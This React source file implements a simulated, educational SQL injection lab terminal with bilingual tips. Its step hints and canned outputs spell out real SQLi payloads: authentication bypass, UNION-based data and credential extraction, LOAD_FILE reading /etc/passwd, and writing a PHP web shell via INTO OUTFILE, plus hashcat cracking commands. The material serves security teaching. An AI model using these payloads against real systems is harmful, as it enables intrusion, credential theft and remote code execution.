/**
 * SQLiTerminal — Lab 04 SQL Injection simulator
 * Interactive vulnerable login form + SQL injection terminal
 */
import { useState, useRef, useEffect, KeyboardEvent } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { Info, Lightbulb, AlertTriangle } from 'lucide-react'

interface CommandOutput {
    lines: string[]
    tipEn?: string
    tipAr?: string
    isError?: boolean
    isSuccess?: boolean
}

interface HistoryEntry {
    input: string
    output: CommandOutput | null
    showTip: boolean
}

interface Props {
    currentStepId?: number | null
    onCommandRun?: (cmd: string) => void
}

const HOSTNAME = 'student@cybermasry'
const CWD = '~/sqli-lab'
const PROMPT = `${HOSTNAME}:${CWD}$`

const ALL_COMMANDS = ['help', 'sqltest', 'sqlmap', 'mysql', 'clear', 'history']

const STEP_HINTS: Record<number, string> = {
    1: `sqltest --url "http://192.168.1.5/login" --user "'"`,
    2: `sqltest --url "http://192.168.1.5/login" --user "' OR '1'='1" --pass "anything"`,
    3: `sqltest --url "http://192.168.1.5/login" --user "admin'--" --pass "whatever"`,
    4: `sqltest --url "http://192.168.1.5/login" --user "' ORDER BY 3--"`,
    5: `sqltest --url "http://192.168.1.5/login" --user "' UNION SELECT 1,version(),3--"`,
    6: `sqltest --url "http://192.168.1.5/login" --user "' UNION SELECT 1,table_name,3 FROM information_schema.tables--"`,
    7: `sqltest --url "http://192.168.1.5/login" --user "' UNION SELECT 1,concat(username,':',password),3 FROM users--"`,
    8: `sqltest --url "http://192.168.1.5/login" --user "' UNION SELECT 1,length(password),3 FROM users LIMIT 1--"`,
    9: `sqltest --url "http://192.168.1.5/login" --user "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--"`,
    10: `sqltest --url "http://192.168.1.5/login" --user "' UNION SELECT 1,'<?php system($_GET[cmd]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--"`,
}

// ─── Command definitions ──────────────────────────────────────────────────────
const COMMANDS: Record<string, (args: string[]) => CommandOutput> = {
    help: () => ({
        lines: [
            '╔═══════════════════════════════════════════════════════╗',
            '║      Cyber-Masry SQLi Lab  –  Help Menu               ║',
            '║   [SIMULATED ENVIRONMENT · EDUCATIONAL USE ONLY]      ║',
            '╚═══════════════════════════════════════════════════════╝',
            '',
            '  Command                                 Description',
            '  ─────────────────────────────────────────────────────',
            '  sqltest --url <url> --user <payload>    Test SQLi payload',
            '  sqltest --url <url> --user x --pass x   With password too',
            '  sqlmap --url <url> --dbs                Auto-detect SQLi',
            '  mysql -h 192.168.1.5 -u root -p         Direct DB access',
            '',
            '  📋 Target: http://192.168.1.5/login',
            "     Start:  sqltest --url \"http://192.168.1.5/login\" --user \"'\"",
        ],
    }),

    sqltest: (args) => {
        const raw = args.join(' ')
        const userMatch = raw.match(/--user "([^"]+)"/)
        const payload = userMatch?.[1] ?? ''
        const p = payload.trim().toLowerCase()

        // Step 1: single quote error
        if (p === "'") {
            return {
                lines: [
                    `[*] Sending request to http://192.168.1.5/login`,
                    `[*] Username: '`,
                    `[*] Password: (empty)`,
                    ``,
                    `[!] HTTP 500 Internal Server Error`,
                    ``,
                    `MySQL Error: You have an error in your SQL syntax;`,
                    `check the manual that corresponds to your MySQL server version`,
                    `for the right syntax to use near ''''' at line 1`,
                    ``,
                    `Raw SQL (leaked in error):`,
                    `  SELECT * FROM users WHERE username=''' AND password=''`,
                    ``,
                    `[+] CONFIRMED: Application is vulnerable to SQL Injection!`,
                    `[+] The error reveals the exact SQL query structure`,
                ],
                tipEn: "A single quote breaks the SQL string syntax and causes a database error. If the server returns this error to the user, it confirms: (1) the app is vulnerable to SQLi, (2) it reveals the exact query structure. The query SELECT * FROM users WHERE username=''' is syntactically broken — three quotes when two are expected.",
                tipAr: "فلتة واحدة ' كسرت الـ SQL query وكشفت السطر بالكامل! ده غلط فادح — المفروض الـ error ما يظهرش للمستخدم أبداً 🚨",
                isSuccess: true,
            }
        }

        // Step 2: OR 1=1
        if (p.includes("or '1'='1") || p.includes('or 1=1')) {
            return {
                lines: [
                    `[*] Sending request to http://192.168.1.5/login`,
                    `[*] Username: ' OR '1'='1`,
                    `[*] Password: anything`,
                    ``,
                    `SQL Query (backend):`,
                    `  SELECT * FROM users`,
                    `  WHERE username='' OR '1'='1' AND password='anything'`,
                    ``,
                    `[+] '1'='1' is ALWAYS TRUE → condition bypassed!`,
                    `[+] HTTP 200 OK — Login Successful!`,
                    ``,
                    `┌─────────────────────────────────────────┐`,
                    `│  ✅ LOGGED IN AS: admin (first row)     │`,
                    `│  Welcome to EvilCorp Admin Panel        │`,
                    `│  FLAG{SQLi_Auth_Bypass_Classic}         │`,
                    `└─────────────────────────────────────────┘`,
                ],
                tipEn: "The query becomes: WHERE username='' OR '1'='1' — the OR clause means the WHERE always returns true (1=1), so no valid username is needed. The database returns the first row, which is usually the admin account. This attack has been around since 1998 and still affects millions of websites because developers don't use parameterized queries.",
                tipAr: "OR '1'='1' بيخلي الـ WHERE condition دايماً صح — زي ما تقول 'لو السما زرقا' في كل جملة 😂 النتيجة: تدخل بدون password",
                isSuccess: true,
            }
        }

        // Step 3: comment-based
        if (p.includes("admin'--") || p.includes("admin' --")) {
            return {
                lines: [
                    `[*] Sending request to http://192.168.1.5/login`,
                    `[*] Username: admin'--`,
                    ``,
                    `SQL Query (transformed):`,
                    `  SELECT * FROM users`,
                    `  WHERE username='admin'-- ' AND password='...'`,
                    `                        ↑ comment cuts here`,
                    ``,
                    `Effective query:`,
                    `  SELECT * FROM users WHERE username='admin'`,
                    ``,
                    `[+] Password check completely eliminated by comment!`,
                    `[+] HTTP 200 OK — Logged in directly as admin!`,
                    ``,
                    `┌─────────────────────────────────────────┐`,
                    `│  ✅ LOGGED IN AS: admin (direct)        │`,
                    `│  No password required                   │`,
                    `│  FLAG{Comment_Bypass_SQL_Expert}        │`,
                    `└─────────────────────────────────────────┘`,
                ],
                tipEn: "-- is the SQL single-line comment syntax (MySQL uses # or --). Everything after -- is ignored by the database engine. So admin'-- effectively removes the AND password check entirely. Attackers use this to log in as ANY known username. This is why CAPTCHAs and the number-of-failed-attempts lock are important defenses.",
                tipAr: "-- في SQL = 'اشيل باقي السطر ده'. بعد ما كتبت admin'-- ، الـ database شاف السطر كأن password مش موجود أصلاً 💬",
                isSuccess: true,
            }
        }

        // Step 4: ORDER BY
        if (p.includes('order by')) {
            const num = parseInt(p.match(/order by (\d+)/)?.[1] ?? '1')
            if (num <= 3) {
                return {
                    lines: [
                        `[*] Sending payload: ' ORDER BY ${num}--`,
                        ``,
                        `[+] HTTP 200 — Query succeeded (column ${num} exists)`,
                        ...(num < 3 ? [`[*] Try ORDER BY ${num + 1} to test next column`] : [
                            `[+] ORDER BY 3 works!`,
                            `[+] ORDER BY 4 would cause an error`,
                            `[+] CONFIRMED: Query returns exactly 3 columns`,
                            `[+] Ready for UNION SELECT 1,2,3 attack!`,
                        ]),
                    ],
                    tipEn: `ORDER BY ${num} tells the database to sort by the ${num}th column. If that column doesn't exist, MySQL throws an error. By incrementing from 1 until we get an error, we determine the column count. With 3 columns confirmed, our UNION SELECT must also have exactly 3 values: UNION SELECT 1,payload,3`,
                    tipAr: `ORDER BY ${num} نجح — يعني فيه على الأقل ${num} أعمدة. بنكمل نرفع الرقم لحد ما الـ query تغلط 🔢`,
                    isSuccess: num === 3,
                }
            }
            return {
                lines: [
                    `[*] Sending payload: ' ORDER BY ${num}--`,
                    `[!] HTTP 500 — Column ${num} does not exist in result set`,
                    `[+] CONFIRMED: Table has exactly ${num - 1} columns`,
                ],
                tipEn: `ORDER BY ${num} failed — column ${num} doesn't exist. This means the query returns exactly ${num - 1} columns. Now you know to use UNION SELECT with ${num - 1} values.`,
                tipAr: `ORDER BY ${num} فشل — يعني الجدول عنده ${num - 1} columns بالظبط. دلوقتي نعمل UNION SELECT بنفس العدد 🎯`,
            }
        }

        // Step 5: UNION version
        if (p.includes('union select') && p.includes('version()')) {
            return {
                lines: [
                    `[*] Sending UNION payload...`,
                    ``,
                    `[+] HTTP 200 — UNION injection successful!`,
                    ``,
                    `Data extracted from database:`,
                    `  Column 2 (injected): 5.7.32-log`,
                    ``,
                    `MySQL Version: 5.7.32-log`,
                    ``,
                    `[!] MySQL 5.7.32 — End of Life since October 2023`,
                    `[!] No more security patches from Oracle`,
                    `[!] 47 known CVEs for this version`,
                ],
                tipEn: "UNION SELECT appends our own query to the original query and returns both result sets. By using version(), we make the database tell us its own version. MySQL 5.7 reached End-of-Life in Oct 2023 — it no longer receives security patches. This version has 47 known CVEs, some critical. Upgrade to MySQL 8.x is mandatory.",
                tipAr: "UNION SELECT بيضيف query تانية على الأصلية! version() بيرجع نسخة الـ database — ودي أي؟ MySQL 5.7 اللي EOL من 2023 😱",
                isSuccess: true,
            }
        }

        // Step 6: information_schema tables
        if (p.includes('information_schema.tables')) {
            return {
                lines: [
                    `[*] Querying information_schema.tables...`,
                    ``,
                    `Tables found in database 'evilcorp_db':`,
                    `  Column 2: users`,
                    `  Column 2: products`,
                    `  Column 2: orders`,
                    `  Column 2: admin_logs`,
                    `  Column 2: sessions`,
                    `  Column 2: password_resets`,
                    ``,
                    `[+] Found 6 tables!`,
                    `[+] Key target: 'users' table — contains credentials`,
                    `[+] 'admin_logs' — may contain sensitive activity logs`,
                ],
                tipEn: "information_schema is a meta-database in MySQL that contains information about all other databases and tables — it's like a yellow pages for your whole database. By querying information_schema.tables, we get a complete list of all table names. This is always the step after confirming UNION SELECT works.",
                tipAr: "information_schema ده دليل تليفونات الـ database كلها! بيجيب اسم كل جدول في كل database على السيرفر 📚",
                isSuccess: true,
            }
        }

        // Step 7: dump users
        if (p.includes('from users') && p.includes('concat')) {
            return {
                lines: [
                    `[*] Dumping users table...`,
                    ``,
                    `Extracted credentials:`,
                    `  admin:5f4dcc3b5aa765d61d8327deb882cf99`,
                    `  omar.badran:e10adc3949ba59abbe56e057f20f883e`,
                    `  it.manager:25d55ad283aa400af464c76d713c07ad`,
                    `  ceo:d8578edf8458ce06fbc5bb76a58c5ca4`,
                    `  sysadmin:827ccb0eea8a706c4c34a16891f84e7b`,
                    ``,
                    `[+] All 5 user credentials extracted!`,
                    `[!] Passwords appear to be MD5 hashed (32 chars)`,
                    `[!] MD5 is broken — crackable in seconds with hashcat`,
                    `[!] Use: hashcat -m 0 hashes.txt rockyou.txt`,
                ],
                tipEn: "MD5 hashes are 32 characters long and completely broken for security. The hash 5f4dcc3b5aa765d61d8327deb882cf99 is MD5('password') — crackable instantly with rainbow tables. Hashcat can crack MD5 hashes at 20+ billion hashes per second on a gaming GPU. Password storage should use bcrypt or Argon2 with salt.",
                tipAr: "MD5 انكسر من زمان! 5f4dcc3b5aa765d61d8327deb882cf99 ده hash كلمة 'password' — Hashcat بيكسره في ثانية واحدة بسبب rainbow tables 🌈",
                isSuccess: true,
            }
        }

        // Step 8: length of password
        if (p.includes('length(password)')) {
            return {
                lines: [
                    `[*] Measuring password hash length...`,
                    ``,
                    `Length of password field: 32`,
                    ``,
                    `Hash type identification:`,
                    `  32 chars → MD5`,
                    `  40 chars → SHA1`,
                    `  64 chars → SHA256`,
                    `  60 chars → bcrypt`,
                    ``,
                    `[!] 32 chars = MD5 — CRITICALLY WEAK!`,
                    `[!] Crack with: hashcat -m 0 -a 0 hashes.txt rockyou.txt`,
                    `[!] MD5 crack speed: ~20 billion/second on RTX 4090`,
                ],
                tipEn: "Hash length tells you the algorithm. MD5=32, SHA1=40, SHA256=64, bcrypt=60. MD5 for passwords was deprecated in 2005 — it has no salt, is extremely fast to brute-force, and has millions of precomputed entries in rainbow tables. bcrypt is the minimum acceptable standard for 2024+.",
                tipAr: "32 حرف = MD5 وده خطر جداً! bcrypt هو minimum المقبول دلوقتي. MD5 بينكسر بـ 20 مليار محاولة في الثانية الواحدة على GPU عادي 🔓",
            }
        }

        // Step 9: LOAD_FILE
        if (p.includes('load_file')) {
            return {
                lines: [
                    `[*] Attempting LOAD_FILE('/etc/passwd')...`,
                    ``,
                    `[+] MySQL FILE privilege granted to current user!`,
                    ``,
                    `File contents:`,
                    `  root:x:0:0:root:/root:/bin/bash`,
                    `  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin`,
                    `  mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false`,
                    `  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`,
                    `  ftpuser:x:1001:1001:,,,:/home/ftpuser:/bin/bash`,
                    ``,
                    `[+] /etc/passwd read successfully!`,
                    `[!] User 'ftpuser' has a real shell — target for SSH brute force`,
                    `[!] MySQL runs as system user — dangerous FILE privilege`,
                ],
                tipEn: "LOAD_FILE() reads arbitrary files from the filesystem IF the MySQL user has the FILE privilege. MySQL running as root (or with FILE privilege) can read /etc/passwd, /etc/shadow (with root), SSH keys, and web application config files. This is why MySQL should NEVER run with elevated system privileges.",
                tipAr: "LOAD_FILE بيقرأ أي ملف على السيرفر! /etc/shadow بيحتوي الـ hashed passwords للـ OS كلها. لو MySQL شغال بـ root = game over 😱",
                isSuccess: true,
            }
        }

        // Step 10: web shell
        if (p.includes('into outfile') && p.includes('shell.php')) {
            return {
                lines: [
                    `[*] Writing PHP shell to web root...`,
                    ``,
                    `[+] INTO OUTFILE successful!`,
                    `[+] File written: /var/www/html/shell.php`,
                    ``,
                    `Testing shell:`,
                    `  GET http://192.168.1.5/shell.php?cmd=id`,
                    `  Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
                    ``,
                    `  GET http://192.168.1.5/shell.php?cmd=cat+/etc/shadow`,
                    `  Response: root:$6$xyz...:18000:0:99999:7:::`,
                    ``,
                    `[+] Remote Code Execution achieved via SQLi → Web Shell!`,
                    `[+] Full system access as www-data`,
                    ``,
                    `🚩 FLAG{SQLi_to_RCE_Master_Level}`,
                    ``,
                    `[!] SQLi → File Write → RCE: this is the "holy trinity" attack chain`,
                ],
                tipEn: "This is the complete SQLi exploitation chain: SQL Injection → File Write → Web Shell → Remote Code Execution. The <?php system($_GET[cmd]); ?> WebShell executes any OS command via HTTP GET. This exact technique was used in major breaches. Defenses: prepared statements, least privilege on MySQL user, disable FILE privilege, WAF rules.",
                tipAr: 'SQLi → RCE! ده أخطر سيناريو ممكن — من خانة login وصلنا لتحكم كامل في السيرفر. ده بيحصل في real-world attacks فعلاً 💀',
                isSuccess: true,
            }
        }

        // Generic
        return {
            lines: [
                `[*] Sending payload: ${payload}`,
                ``,
                `[*] Response: 401 Unauthorized`,
                `[*] Login failed`,
                ``,
                `[*] Hint: Try the step hint command above`,
                `[*] Type 'help' to see available commands`,
            ],
        }
    },

    sqlmap: (args) => {
        const raw = args.join(' ')
        if (raw.includes('--dbs')) {
            return {
                lines: [
                    `sqlmap v1.7 by Bernardo Damele & Miroslav Stampar`,
                    ``,
                    `[*] testing connection to target URL`,
                    `[*] testing if the target URL content is stable`,
                    `[*] testing if GET parameter 'id' is dynamic`,
                    `[+] GET parameter 'id' appears to be dynamic`,
                    `[*] heuristic (basic) test shows that GET parameter might be injectable`,
                    `[+] GET parameter 'id' is 'AND boolean-based blind' injectable`,
                    ``,
                    `[+] retrieved: information_schema`,
                    `[+] retrieved: evilcorp_db`,
                    `[+] retrieved: mysql`,
                    ``,
                    `available databases [3]:`,
                    `  [*] evilcorp_db`,
                    `  [*] information_schema`,
                    `  [*] mysql`,
                ],
                tipEn: 'sqlmap is an automated SQL injection tool. While powerful, it is LOUD — every IDS/WAF will detect it immediately. Always get written authorization before running sqlmap. In bug bounties, many programs ban sqlmap explicitly.',
                tipAr: 'sqlmap أداة رهيبة بس صوتها عالي جداً! أي IDS هيحس بيها فوراً. دايماً اتأكد من الإذن قبل ما تشغلها 🚨',
            }
        }
        return {
            lines: [`sqlmap: missing --url argument. Use: sqlmap --url 'http://192.168.1.5/login' --dbs`],
            isError: true,
        }
    },

    mysql: () => ({
        lines: [
            `ERROR 1045 (28000): Access denied for user 'root'@'localhost'`,
            ``,
            `[*] Direct MySQL access blocked from this machine`,
            `[*] MySQL should only accept connections from localhost`,
            `[*] But... if we got a web shell, we could run mysql from there!`,
        ],
        tipEn: 'MySQL should only accept connections from 127.0.0.1 (localhost). If it is bound to 0.0.0.0, any IP can try to connect. The access denied is expected — but some misconfigured servers allow remote root login with an empty password.',
        tipAr: 'MySQL المفروض يقبل connections من localhost بس. لو مفتوح على 0.0.0.0 = أي حد يقدر يحاول يدخل عليه 🛡️',
    }),

    history: () => ({
        lines: [
            `    1  sqltest --url "http://192.168.1.5/login" --user "'"`,
            `    2  sqltest --url "http://192.168.1.5/login" --user "' OR '1'='1" --pass "anything"`,
            `    3  sqltest --url "http://192.168.1.5/login" --user "admin'--"`,
            `    4  sqltest --url "http://192.168.1.5/login" --user "' ORDER BY 3--"`,
            `    5  sqltest --url "http://192.168.1.5/login" --user "' UNION SELECT 1,version(),3--"`,
        ],
    }),

    clear: () => ({ lines: ['__CLEAR__'] }),
}

// ─── Component ─────────────────────────────────────────────────────────────────
export default function SQLiTerminal({ currentStepId, onCommandRun }: Props) {
    const [input, setInput] = useState('')
    const [history, setHistory] = useState<HistoryEntry[]>([])
    const [cmdHistory, setCmdHistory] = useState<string[]>([])
    const [historyIdx, setHistoryIdx] = useState(-1)
    const [autoHint, setAutoHint] = useState('')
    const inputRef = useRef<HTMLInputElement>(null)
    const terminalBodyRef = useRef<HTMLDivElement>(null)

    useEffect(() => {
        if (terminalBodyRef.current) {
            terminalBodyRef.current.scrollTop = terminalBodyRef.current.scrollHeight
        }
    }, [history])

    useEffect(() => {
        if (input.length < 2) { setAutoHint(''); return }
        const base = input.split(' ')[0]
        const match = ALL_COMMANDS.find((c) => c.startsWith(base) && c !== base)
        setAutoHint(match && input === base ? match.slice(base.length) : '')
    }, [input])

    const runCommand = (raw: string) => {
        const trimmed = raw.trim()
        if (!trimmed) return

        const parts = trimmed.split(/\s+/)
        const cmd = parts[0].toLowerCase()
        const args = parts.slice(1)

        let output: CommandOutput | null = COMMANDS[cmd]
            ? COMMANDS[cmd](args)
            : { lines: [`${cmd}: command not found`, "Type 'help' to see available commands."], isError: true }

        if (output?.lines[0] === '__CLEAR__') {
            setHistory([])
            setCmdHistory((p) => [...p, trimmed])
            setHistoryIdx(-1)
            setInput('')
            return
        }

        setHistory((p) => [...p, { input: trimmed, output, showTip: false }])
        setCmdHistory((p) => [...p, trimmed])
        setHistoryIdx(-1)
        setInput('')
        onCommandRun?.(trimmed)
    }

    const handleKeyDown = (e: KeyboardEvent<HTMLInputElement>) => {
        if (e.key === 'Enter') {
            runCommand(input)
        } else if (e.key === 'ArrowUp') {
            e.preventDefault()
            const idx = Math.min(historyIdx + 1, cmdHistory.length - 1)
            setHistoryIdx(idx)
            setInput(cmdHistory[cmdHistory.length - 1 - idx] || '')
        } else if (e.key === 'ArrowDown') {
            e.preventDefault()
            const idx = Math.max(historyIdx - 1, -1)
            setHistoryIdx(idx)
            setInput(idx === -1 ? '' : cmdHistory[cmdHistory.length - 1 - idx] || '')
        } else if (e.key === 'Tab') {
            e.preventDefault()
            if (autoHint) setInput(input + autoHint)
        }
    }

    const toggleTip = (idx: number) =>
        setHistory((p) => p.map((e, i) => (i === idx ? { ...e, showTip: !e.showTip } : e)))

    const stepHint = currentStepId && STEP_HINTS[currentStepId] ? STEP_HINTS[currentStepId] : null

    return (
        <div className="terminal-window h-full flex flex-col" onClick={() => inputRef.current?.focus()}>
            {/* Header bar removed to sit flush with tab bar */}

            <AnimatePresence>
                {stepHint && (
                    <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }}
                        className="bg-neon-amber/10 border-b border-neon-amber/30 px-4 py-2 flex items-center gap-3 flex-shrink-0">
                        <Lightbulb size={14} className="text-neon-amber flex-shrink-0" />
                        <span className="font-mono text-xs text-neon-amber/80">
                            Next: <code className="text-neon-green cursor-pointer hover:underline break-all" onClick={() => setInput(stepHint)}>{stepHint}</code>
                            <span className="text-neon-amber/40 ml-2">— click to fill, Enter to run</span>
                        </span>
                    </motion.div>
                )}
            </AnimatePresence>

            <div ref={terminalBodyRef} className="terminal-body flex-1 overflow-y-auto select-text">
                <div className="mb-4 space-y-0.5">
                    <div className="font-mono text-xs text-red-400/70">⚠ Cyber-Masry SQLi Lab — EDUCATIONAL SIMULATION ONLY</div>
                    <div className="font-mono text-xs text-gray-600">═════════════════════════════════════════════════════</div>
                    <div className="font-mono text-xs text-gray-500">100% Simulated — No real database connections made</div>
                    <div className="font-mono text-xs text-neon-amber/70 pt-1">
                        Target: <span className="text-neon-orange">http://192.168.1.5/login</span>
                        {'  ·  '}Type <span className="text-neon-amber cursor-pointer hover:underline" onClick={() => { setInput('help'); setTimeout(() => runCommand('help'), 50) }}>help</span>
                    </div>
                    <div className="font-cairo text-xs text-gray-600 italic">تعلّم SQLi بالتجربة المباشرة — بأمان تام! 💉</div>
                </div>

                <div className="history-container">
                    {history.map((entry, idx) => (
                        <div key={idx} className="mb-3">
                            <div className="flex items-center gap-1 flex-wrap">
                                <span className="neon-text-green font-mono text-xs">{PROMPT}</span>
                                <span className="text-neon-amber font-mono text-xs ml-1 break-all">{entry.input}</span>
                            </div>
                            {entry.output && (
                                <div className="mt-1 ml-2">
                                    {entry.output.lines.map((line, li) => (
                                        <div key={li} className={`font-mono text-xs leading-5 whitespace-pre-wrap ${entry.output?.isError ? 'text-red-400'
                                                : line.includes('FLAG{') ? 'text-neon-amber font-bold'
                                                    : line.includes('[+]') ? 'text-neon-green'
                                                        : line.includes('[!]') ? 'text-neon-amber/70'
                                                            : line.includes('MySQL Error') || line.includes('500') ? 'text-red-400'
                                                                : line.includes('✅') ? 'text-neon-green font-bold'
                                                                    : 'text-gray-300'
                                            }`}>
                                            {line || '\u00A0'}
                                        </div>
                                    ))}
                                    {(entry.output.tipEn || entry.output.tipAr) && (
                                        <div className="mt-2">
                                            <button onClick={() => toggleTip(idx)} className="flex items-center gap-1 font-mono text-xs text-neon-amber/60 hover:text-neon-amber transition-colors">
                                                <Info size={12} />
                                                <span>{entry.showTip ? '▾ Hide' : '▸ Show'} 💡 Explanation</span>
                                            </button>
                                            <AnimatePresence>
                                                {entry.showTip && (
                                                    <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }} className="overflow-hidden">
                                                        {entry.output.tipEn && <div className="bg-neon-amber/5 border-l-2 border-neon-amber/40 pl-3 pr-2 py-2 mt-1 rounded-r font-mono text-xs text-gray-300 leading-relaxed">{entry.output.tipEn}</div>}
                                                        {entry.output.tipAr && <div className="tip-box mt-1">{entry.output.tipAr}</div>}
                                                    </motion.div>
                                                )}
                                            </AnimatePresence>
                                        </div>
                                    )}
                                </div>
                            )}
                        </div>
                    ))}
                </div>

                <div className="flex items-center gap-1">
                    <span className="neon-text-green font-mono text-xs flex-shrink-0">{PROMPT}</span>
                    <div className="relative flex-1 min-w-0">
                        <div className="absolute inset-0 font-mono text-xs text-gray-600 pointer-events-none flex items-center">
                            <span className="invisible">{input}</span>
                            <span>{autoHint}</span>
                        </div>
                        <input ref={inputRef} type="text" value={input} onChange={(e) => setInput(e.target.value)}
                            onKeyDown={handleKeyDown}
                            className="w-full bg-transparent font-mono text-xs text-gray-200 outline-none caret-neon-green relative z-10"
                            spellCheck={false} autoComplete="off" aria-label="SQLi terminal input" />
                    </div>
                    <span className="terminal-cursor flex-shrink-0" />
                </div>
            </div>

            <div className="border-t border-dark-border px-3 py-2 flex gap-4 flex-shrink-0 flex-wrap">
                {[['↑↓', 'history'], ['Tab', 'autocomplete'], ['Enter', 'run'], ['click hint', 'fill']].map(([key, label]) => (
                    <div key={key} className="flex items-center gap-1">
                        <kbd className="font-mono text-xs bg-dark-border px-1.5 py-0.5 rounded text-neon-amber/70">{key}</kbd>
                        <span className="font-mono text-xs text-gray-600">{label}</span>
                    </div>
                ))}
                <div className="ml-auto font-cairo text-xs text-gray-700 italic">محاكاة · مفيش اتصال حقيقي</div>
            </div>
        </div>
    )
}
